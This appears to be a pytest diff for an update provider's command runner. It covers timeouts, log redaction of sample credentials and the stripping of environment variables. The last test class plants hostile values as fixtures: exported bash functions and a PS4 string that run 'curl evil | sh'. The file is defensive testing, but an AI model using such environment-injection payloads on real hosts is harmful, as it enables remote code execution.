@@ -479,6 +479,25 @@ def _stream(data: bytes) -> asyncio.StreamReader:
     return reader
 
 
+def _wait_for_raising(exc: BaseException):
+    """A ``wait_for`` stand-in that fails with *exc* without running the awaitable.
+
+    The code under test hands ``wait_for`` a fresh ``proc.communicate()``
+    coroutine on both the turn and the reap path. A plain ``AsyncMock`` with a
+    ``side_effect`` drops that argument un-awaited, and the interpreter reports
+    it at garbage collection against some later test; closing it first keeps
+    the stand-in faithful to the real ``wait_for``, which always consumes what
+    it is given.
+    """
+
+    async def _wait_for(aw, timeout=None):
+        if asyncio.iscoroutine(aw):
+            aw.close()
+        raise exc
+
+    return _wait_for
+
+
 def _fake_proc(returncode: int = 0, stdout: bytes = b"", stderr: bytes = b"") -> "MagicMock":
     """Build a mock subprocess the production code can actually read.
 
@@ -534,7 +553,7 @@ class TestCommandProviderNoShellAndTimeout:
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
-            patch("asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())),
+            patch("asyncio.wait_for", _wait_for_raising(asyncio.TimeoutError())),
         ):
             result = await p.check()
         assert result.error == "check_command timed out"
@@ -559,8 +578,8 @@ class TestCommandProviderNoShellAndTimeout:
             patch.object(sys, "platform", "linux"),
         ):
             result = await p.check()
-        # Any spawn failure becomes an error verdict; the message no longer
-        # names the shell because OSError covers more than "missing binary".
+        # Any spawn failure becomes an error verdict; the message does not
+        # name the shell because OSError covers more than "missing binary".
         assert result.error and result.available is False
 
     @pytest.mark.asyncio
@@ -577,7 +596,7 @@ class TestCommandProviderNoShellAndTimeout:
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
-            patch("asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())),
+            patch("asyncio.wait_for", _wait_for_raising(asyncio.TimeoutError())),
         ):
             assert await p.apply() is False
         proc.kill.assert_called_once()
@@ -602,15 +621,35 @@ class TestCommandProviderNoShellAndTimeout:
         ):
             assert await p.apply() is False
 
-    @pytest.mark.asyncio
-    async def test_apply_failure_redacts_stderr(self) -> None:
-        import types
+    # -- stderr redaction goes through the platform context --
+    #
+    # An installer failure is prime territory for a host-specific credential
+    # shape (an internal registry cookie, an SSO token in a fetch URL), and those
+    # live in a companion's regexes rather than in the OSS baseline. These assert
+    # the OBSERVABLE outcome -- what does and does not reach the log line -- and
+    # deliberately not "which redaction function was called": the previous
+    # version of this test stubbed the whole ``kiro_crew.security`` module and
+    # asserted two specific calls, so it pinned the old spelling rather than the
+    # guarantee, and any change of redactor broke it whether or not the log was
+    # still safe.
 
+    @staticmethod
+    def _install_policy(policy) -> None:
+        import dataclasses
+
+        from kiro_crew.config.loader import KiroCrewConfig
+        from kiro_crew.platform import PROFILE_ENTERPRISE, build_default_context, set_context
+
+        set_context(
+            dataclasses.replace(
+                build_default_context(KiroCrewConfig(), profile=PROFILE_ENTERPRISE),
+                credentials=policy,
+            )
+        )
+
+    async def _apply_with_stderr(self, stderr: bytes) -> None:
         p = CommandProvider(check_command="echo hi", apply_command="fail")
-        proc = _fake_proc(returncode=1, stderr=b"token=secret123 failed")
-        sec = types.ModuleType("kiro_crew.security")
-        sec.redact_credentials = MagicMock(side_effect=lambda t: (t, 0))  # type: ignore[attr-defined]
-        sec.redact_exfiltration_urls = MagicMock(side_effect=lambda t: (t, 0))  # type: ignore[attr-defined]
+        proc = _fake_proc(returncode=1, stderr=stderr)
         with (
             patch(
                 "kiro_crew.platform.update_provider._shell_exec_args",
@@ -621,11 +660,61 @@ class TestCommandProviderNoShellAndTimeout:
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
-            patch.dict(sys.modules, {"kiro_crew.security": sec}),
         ):
             assert await p.apply() is False
-        sec.redact_credentials.assert_called_once()
-        sec.redact_exfiltration_urls.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_apply_failure_scrubs_stderr_through_the_context(
+        self, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        from kiro_crew import security
+        from kiro_crew.platform import reset_context
+
+        class _Policy:
+            def redact(self, text: str) -> str:
+                return security.redact(text).replace("SSO-COOKIE", "[REDACTED-SSO]")
+
+        self._install_policy(_Policy())
+        try:
+            with caplog.at_level(logging.ERROR):
+                await self._apply_with_stderr(
+                    b"fetch rejected SSO-COOKIE=abc123 key=AKIAIOSFODNN7EXAMPLE"
+                )
+        finally:
+            reset_context()
+        logged = "\n".join(r.getMessage() for r in caplog.records)
+        assert "CommandProvider.apply: failed" in logged
+        # The companion's extra reach -- the whole point of routing via context.
+        assert "SSO-COOKIE" not in logged
+        # ...without losing the baseline pass underneath it.
+        assert "AKIAIOSFODNN7EXAMPLE" not in logged
+
+    @pytest.mark.asyncio
+    async def test_apply_failure_withholds_stderr_when_composition_fails(
+        self, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        """A host that cannot compose its companion still reports the failure.
+
+        ``apply()`` must return False and log the return code -- the operator's
+        actionable part -- with only the untrusted stderr text withheld.
+        """
+        from kiro_crew.platform import PlatformCompositionError, reset_context
+        from kiro_crew.platform.context import LOG_WITHHELD_PLACEHOLDER
+
+        class _Unprovable:
+            def redact(self, text: str) -> str:
+                raise PlatformCompositionError("companion could not be composed")
+
+        self._install_policy(_Unprovable())
+        try:
+            with caplog.at_level(logging.ERROR):
+                await self._apply_with_stderr(b"fetch rejected token=secret123")
+        finally:
+            reset_context()
+        logged = "\n".join(r.getMessage() for r in caplog.records)
+        assert "rc=1" in logged
+        assert LOG_WITHHELD_PLACEHOLDER in logged
+        assert "secret123" not in logged
 
 
 class TestCancellationKillsUpdaterChild:
@@ -663,7 +752,7 @@ class TestCancellationKillsUpdaterChild:
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
-            patch("asyncio.wait_for", AsyncMock(side_effect=asyncio.CancelledError())),
+            patch("asyncio.wait_for", _wait_for_raising(asyncio.CancelledError())),
         ):
             with pytest.raises(asyncio.CancelledError):
                 await p.apply()
@@ -683,7 +772,7 @@ class TestCancellationKillsUpdaterChild:
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
-            patch("asyncio.wait_for", AsyncMock(side_effect=asyncio.CancelledError())),
+            patch("asyncio.wait_for", _wait_for_raising(asyncio.CancelledError())),
         ):
             with pytest.raises(asyncio.CancelledError):
                 await p.check()
@@ -720,7 +809,9 @@ class TestCancellationKillsUpdaterChild:
         child leaves its members running and can leave communicate() waiting on
         pipes those survivors hold."""
         proc = MagicMock()
-        proc.pid = 4242
+        # No supported OS can allocate this PID, so the host process table cannot
+        # make the fake child look like it shares the test runner's process group.
+        proc.pid = 99_999_999_999
         proc.kill = MagicMock()
         proc.communicate = AsyncMock(return_value=(b"", b""))
         proc.stdout = _stream(b"")
@@ -729,7 +820,7 @@ class TestCancellationKillsUpdaterChild:
         with patch("kiro_crew.platform_compat.kill_process_tree_async", AsyncMock()) as tree:
             await _kill_and_reap(proc)
         tree.assert_awaited_once()
-        assert tree.await_args.args[0] == 4242
+        assert tree.await_args.args[0] == proc.pid
 
     @pytest.mark.asyncio
     async def test_kill_and_reap_bounds_the_reap(self, monkeypatch: pytest.MonkeyPatch) -> None:
@@ -1362,7 +1453,7 @@ class TestWhitespaceCommandsAreNotPresence:
 
 class TestRedactionHappensBeforeTruncation:
     """Slicing stderr to 500 chars BEFORE redacting can cut a credential in half,
-    and half a token no longer matches the redactors' patterns, so the surviving
+    and half a token does not match the redactors' patterns, so the surviving
     fragment reaches gateway.log and /api/logs verbatim. Order, not presence, is
     what makes the redaction effective."""
 
@@ -1449,3 +1540,53 @@ class TestCanApply:
         ) as argv:
             assert provider.can_apply() is True
         argv.assert_called_once_with("platform-apply")
+
+
+class TestShellCodeEnvStripping:
+    """An exported shell function shadows a command word outright.
+
+    ``_trusted_path_env`` narrows ``PATH`` so a planted binary cannot shadow the
+    operator's command word, but bash imports FUNCTIONS from the environment --
+    ``BASH_FUNC_<name>%%`` on 4.3+, ``BASH_FUNC_<name>()`` on the patched 4.2 --
+    and a function beats the ``PATH`` lookup entirely rather than competing in
+    it. The command runs through ``[<sh>, "-c", ...]``, so on any host whose
+    ``sh`` is bash this is reachable.
+    """
+
+    def test_exported_shell_functions_do_not_reach_the_update_command(self) -> None:
+        planted = {
+            "BASH_FUNC_acme-pkg%%": "() { curl evil | sh; }",
+            "BASH_FUNC_acme-pkg()": "() { curl evil | sh; }",
+            "BASH_FUNC_grep%%": "() { :; }",
+        }
+        with (
+            patch.dict(os.environ, {"PATH": "/usr/bin", "LANG": "C", **planted}),
+            patch(
+                "kiro_crew.platform.update_provider.trusted_system_path",
+                return_value="/usr/bin:/bin",
+            ),
+        ):
+            env = _trusted_path_env()
+        assert env is not None
+        leaked = sorted(k for k in env if k.startswith("BASH_FUNC_"))
+        assert not leaked, f"exported shell functions reached the child: {leaked}"
+        # The deliberate pass-through (proxy / locale / credential helpers) stays.
+        assert env["LANG"] == "C"
+
+    def test_the_shell_tracing_pair_does_not_reach_the_update_command(self) -> None:
+        # SHELLOPTS switches xtrace on and PS4 is expanded with command
+        # substitution, so a payload in PS4 runs before the command does.
+        with (
+            patch.dict(
+                os.environ,
+                {"PATH": "/usr/bin", "SHELLOPTS": "xtrace", "PS4": "$(curl evil | sh)"},
+            ),
+            patch(
+                "kiro_crew.platform.update_provider.trusted_system_path",
+                return_value="/usr/bin:/bin",
+            ),
+        ):
+            env = _trusted_path_env()
+        assert env is not None
+        assert "SHELLOPTS" not in env
+        assert "PS4" not in env
